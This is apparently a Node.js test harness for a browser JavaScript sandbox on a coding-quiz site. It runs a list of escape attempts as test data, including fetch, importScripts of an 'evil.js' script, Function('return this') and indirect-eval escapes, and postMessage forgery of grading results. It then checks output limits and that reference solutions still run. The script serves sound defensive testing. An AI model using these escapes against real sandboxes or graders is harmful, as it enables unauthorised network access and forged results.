// Executes the real WORKER_SOURCE from src/hooks/useJsRunner.ts inside a
// node:vm context that stands in for a DedicatedWorkerGlobalScope, then:
//
//   1. tries every attack the sandbox is supposed to stop, and
//   2. replays the committed JavaScript reference solutions plus snippets
//      covering the language features the expert problems use, to prove the
//      lockdown didn't break legitimate code.
//
// A vm context is used rather than a stub object because it gives a genuinely
// separate global object -- so `Function('return this')()` inside the sandbox
// returns that global, exactly as it would in a browser worker. Shadowing
// alone would pass a weaker test.
//
//   node scripts/verify-js-sandbox.mjs
//
import { build } from 'esbuild';
import vm from 'node:vm';
import { mkdtemp, rm } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join, resolve } from 'node:path';

const ROOT = resolve(import.meta.dirname, '..');

async function loadModule(relPath, name) {
  const dir = await mkdtemp(join(tmpdir(), 'pyquests-' + name + '-'));
  const outfile = join(dir, name + '.mjs');
  await build({
    entryPoints: [join(ROOT, relPath)],
    outfile,
    format: 'esm',
    platform: 'node',
    bundle: true,
    logLevel: 'silent',
  });
  const mod = await import('file://' + outfile);
  await rm(dir, { recursive: true, force: true });
  return mod;
}

const { WORKER_SOURCE, BLOCKED_WORKER_GLOBALS } = await loadModule('src/hooks/useJsRunner.ts', 'jsrunner');

// Records any dangerous capability that actually got invoked.
const breaches = [];

function createWorkerContext() {
  const sandbox = {};
  const context = vm.createContext(sandbox);

  // Build a global that looks like a worker scope: `self` points at the
  // context's own global, and the dangerous APIs are present and functional
  // so a successful call is observable rather than a silent no-op.
  vm.runInContext('globalThis.self = globalThis;', context);

  const spy = (name) => function (...args) {
    breaches.push({ name, args: args.map((a) => String(a).slice(0, 60)) });
    return { __spied: name };
  };

  // vm.createContext gives the language builtins only. A worker scope also
  // has timers and they are intentionally left unblocked, so inject them --
  // otherwise this harness reports "setTimeout is not defined" and looks
  // like a sandbox regression when it is a gap in the stand-in.
  Object.assign(sandbox, {
    setTimeout,
    clearTimeout,
    setInterval,
    clearInterval,
    queueMicrotask,
    structuredClone,
    performance,
    crypto,
    TextEncoder,
    TextDecoder,
  });

  const dangerous = {
    fetch: spy('fetch'),
    XMLHttpRequest: class { constructor() { breaches.push({ name: 'XMLHttpRequest', args: [] }); } },
    WebSocket: class { constructor(u) { breaches.push({ name: 'WebSocket', args: [String(u)] }); } },
    EventSource: class { constructor(u) { breaches.push({ name: 'EventSource', args: [String(u)] }); } },
    importScripts: spy('importScripts'),
    navigator: { sendBeacon: spy('navigator.sendBeacon'), userAgent: 'test' },
    indexedDB: { open: spy('indexedDB.open') },
    caches: { open: spy('caches.open') },
    localStorage: { setItem: spy('localStorage.setItem') },
    sessionStorage: { setItem: spy('sessionStorage.setItem') },
    close: spy('close'),
    addEventListener: spy('addEventListener'),
    removeEventListener: spy('removeEventListener'),
    dispatchEvent: spy('dispatchEvent'),
    Worker: class { constructor() { breaches.push({ name: 'Worker', args: [] }); } },
    SharedWorker: class { constructor() { breaches.push({ name: 'SharedWorker', args: [] }); } },
    BroadcastChannel: class { constructor(n) { breaches.push({ name: 'BroadcastChannel', args: [String(n)] }); } },
    MessageChannel: class { constructor() { breaches.push({ name: 'MessageChannel', args: [] }); } },
    MessagePort: class {},
    Notification: class { constructor(t) { breaches.push({ name: 'Notification', args: [String(t)] }); } },
    location: { href: 'blob:https://pyquests.example/abc', origin: 'https://pyquests.example' },
  };
  Object.assign(sandbox, dangerous);

  // The host side of the worker: results arrive here.
  const posted = [];
  sandbox.postMessage = (msg) => { posted.push(msg); };

  vm.runInContext(WORKER_SOURCE, context);
  return { context, sandbox, posted };
}

function runInSandbox(code) {
  const { sandbox, posted } = createWorkerContext();
  const before = breaches.length;
  const result = sandbox.onmessage({ data: { code } });
  return Promise.resolve(result).then(() => ({
    posted,
    newBreaches: breaches.slice(before),
  }));
}

// ---------------------------------------------------------------------
// Part 1 -- attacks that must be blocked
// ---------------------------------------------------------------------
const ATTACKS = [
  ['외부 네트워크 요청',        `await fetch('https://example.com')`],
  ['same-origin 요청',          `await fetch('/')`],
  ['XMLHttpRequest',            `const x = new XMLHttpRequest(); x.open('GET','/');`],
  ['importScripts',             `importScripts('https://example.com/evil.js')`],
  ['indexedDB',                 `indexedDB.open('x')`],
  ['Cache Storage',             `await caches.open('x')`],
  ['WebSocket',                 `new WebSocket('wss://example.com')`],
  ['EventSource',               `new EventSource('/stream')`],
  ['sendBeacon (navigator)',    `navigator.sendBeacon('/log', 'data')`],
  ['채점 결과 위조 (postMessage)', `self.postMessage({ ok: true, stdout: '정답' })`],
  ['globalThis 경유 fetch',     `await globalThis.fetch('https://example.com')`],
  ['Function 탈출 경유 fetch',  `await Function('return this')().fetch('https://example.com')`],
  ['Function 탈출 경유 위조',   `Function('return this')().postMessage({ ok: true, stdout: '정답' })`],
  ['indirect eval 경유 fetch',  `await (0, eval)('fetch')('https://example.com')`],
  ['전역 복구 시도',            `Object.defineProperty(self, 'fetch', { value: () => 'restored' }); await fetch('/')`],
  ['중첩 워커 생성',            `new Worker('data:,')`],
  ['BroadcastChannel',          `new BroadcastChannel('x').postMessage('y')`],
  ['워커 강제 종료',            `close()`],
  ['핸들러 가로채기',           `addEventListener('message', () => {})`],
  ['Notification',              `new Notification('hi')`],
  ['location 정보 읽기',        `console.log(location.origin)`],
];

console.log('=== 공격 차단 검증 ===\n');
console.log('| # | 시나리오 | 차단 | 결과 |');
console.log('|---|---|---|---|');

let attackFailures = 0;
for (let i = 0; i < ATTACKS.length; i++) {
  const [label, code] = ATTACKS[i];
  const { posted, newBreaches } = await runInSandbox(code);
  const msg = posted[posted.length - 1] || {};

  // Blocked means: the dangerous capability was never actually invoked, and
  // the run did not report success with forged output.
  const capabilityUsed = newBreaches.length > 0;
  const forged = msg.ok === true && String(msg.stdout || '').includes('정답');
  const blocked = !capabilityUsed && !forged;

  if (!blocked) attackFailures++;
  const detail = capabilityUsed
    ? '실제 호출됨: ' + newBreaches.map((b) => b.name).join(', ')
    : forged
      ? '결과 위조 성공'
      : (msg.error || '(에러 없이 통과)').split('\n')[0].slice(0, 58);
  console.log(`| ${i + 1} | ${label} | ${blocked ? '차단' : '**실패**'} | ${detail} |`);
}

// ---------------------------------------------------------------------
// Part 2 -- resource limits
// ---------------------------------------------------------------------
console.log('\n=== 자원 제한 검증 ===\n');

const outputBomb = await runInSandbox(`for (let i = 0; i < 100000; i++) console.log('x'.repeat(50));`);
const bombMsg = outputBomb.posted[0] || {};
const lines = String(bombMsg.stdout || '').split('\n').length;
const chars = String(bombMsg.stdout || '').length;
const capped = chars < 11000 && String(bombMsg.stdout).includes('출력이 너무 많아');
console.log(`출력 폭탄 (100,000줄 시도) -> ${lines}줄 / ${chars}자, 상한 적용: ${capped ? '예' : '아니오'}`);

const manyArgs = await runInSandbox(`console.log('a'.repeat(50000));`);
const manyMsg = manyArgs.posted[0] || {};
console.log(`단일 거대 출력 (50,000자) -> ${String(manyMsg.stdout || '').length}자로 절단`);

// ---------------------------------------------------------------------
// Part 3 -- legitimate code must still work
// ---------------------------------------------------------------------
const { problems } = await loadModule('src/data/problems.ts', 'problems');
const scMod = await loadModule('src/data/solutionCode.ts', 'solutions');
const solutionCode = scMod.solutionCode || scMod.default;
const { decodeAnswer } = await loadModule('src/utils/answerObfuscation.ts', 'obf');

const jsCoding = problems.filter((p) => p.language === 'js' && p.type === 'coding');

console.log('\n=== 기존 JS coding 문제 정답 코드 재검증 ===\n');
let solved = 0;
let noSolution = 0;
const regressions = [];

for (const problem of jsCoding) {
  const code = solutionCode[problem.id];
  if (!code) { noSolution++; continue; }

  const { posted } = await runInSandbox(code);
  const msg = posted[0] || {};
  const expected = problem.testCases?.[0]
    ? decodeAnswer(problem.testCases[0].expected).replace(/^['"]|['"]$/g, '').replace(/\r\n/g, '\n').trim()
    : '';
  const actual = String(msg.stdout || '').replace(/\r\n/g, '\n').trim();

  if (msg.ok && actual === expected) solved++;
  else regressions.push({ id: problem.id, error: msg.error, expected, actual });
}

console.log(`정답 코드 보유 문제: ${jsCoding.length - noSolution}개 / 전체 ${jsCoding.length}개`);
console.log(`샌드박스 통과:       ${solved}개`);
if (regressions.length) {
  console.log('\n회귀 발생:');
  for (const r of regressions) {
    console.log(`  - ${r.id}`);
    console.log(`      error:    ${r.error || '(없음)'}`);
    console.log(`      expected: ${JSON.stringify(r.expected).slice(0, 90)}`);
    console.log(`      actual:   ${JSON.stringify(r.actual).slice(0, 90)}`);
  }
}
if (noSolution > 0) {
  const missing = jsCoding.filter((p) => !solutionCode[p.id]).map((p) => p.id);
  console.log(`\n정답 코드 없음 (${noSolution}개, 이 하네스로 검증 불가): ${missing.join(', ')}`);
}

// Language features the expert problems rely on, since those have no
// committed reference solution to replay.
const FEATURE_CHECKS = [
  ['클로저',        `const c=(()=>{let n=0;return()=>++n})();c();c();console.log(c())`, '3'],
  ['Map 메모이제이션', `const m=new Map();const f=(n)=>{if(n<2)return n;if(m.has(n))return m.get(n);const v=f(n-1)+f(n-2);m.set(n,v);return v};console.log(f(30))`, '832040'],
  ['고차함수 파이프라인', `console.log([1,2,3,4].filter(n=>n%2===0).map(n=>n*10).reduce((a,b)=>a+b,0))`, '60'],
  ['제너레이터',    `function* g(){let [a,b]=[0,1];for(;;){yield a;[a,b]=[b,a+b]}}const it=g();const o=[];for(let i=0;i<8;i++)o.push(it.next().value);console.log(o.join(','))`, '0,1,1,2,3,5,8,13'],
  ['클래스 상속',   `class A{speak(){return 'A'}}class B extends A{speak(){return 'B'+super.speak()}}console.log(new B().speak())`, 'BA'],
  ['Promise.all',   `const p=n=>new Promise(r=>setTimeout(()=>r(n),1));const v=await Promise.all([p(1),p(2),p(3)]);console.log(v.reduce((a,b)=>a+b,0))`, '6'],
  ['async/await + 에러', `try{await Promise.reject(new Error('boom'))}catch(e){console.log('caught:'+e.message)}`, 'caught:boom'],
  ['setTimeout 순서', `console.log('1');await new Promise(r=>setTimeout(r,0));console.log('2')`, '1\n2'],
  ['JSON/Math/Date', `console.log(JSON.stringify({a:Math.max(1,2)}), typeof Date.now())`, '{"a":2} number'],
  ['Symbol/Set/BigInt', `console.log([...new Set([1,1,2])].length, typeof Symbol(), (2n**10n).toString())`, '2 symbol 1024'],
];

console.log('\n=== 허용되어야 하는 언어 기능 (expert 문제가 쓰는 것들) ===\n');
let featureFailures = 0;
for (const [label, code, expected] of FEATURE_CHECKS) {
  const { posted } = await runInSandbox(code);
  const msg = posted[0] || {};
  const actual = String(msg.stdout || '').trim();
  const pass = msg.ok && actual === expected;
  if (!pass) featureFailures++;
  console.log(`${pass ? 'OK  ' : '실패'} ${label}${pass ? '' : ` -> expected ${JSON.stringify(expected)}, got ${JSON.stringify(actual)} ${msg.error || ''}`}`);
}

// ---------------------------------------------------------------------
console.log('\n=== 요약 ===');
console.log(`차단 실패한 공격:        ${attackFailures} / ${ATTACKS.length}`);
console.log(`정답 코드 회귀:          ${regressions.length} / ${jsCoding.length - noSolution}`);
console.log(`언어 기능 실패:          ${featureFailures} / ${FEATURE_CHECKS.length}`);
console.log(`차단 목록 전역 수:       ${Object.keys(BLOCKED_WORKER_GLOBALS).length}`);

const failed = attackFailures + regressions.length + featureFailures;
process.exit(failed === 0 ? 0 : 1);
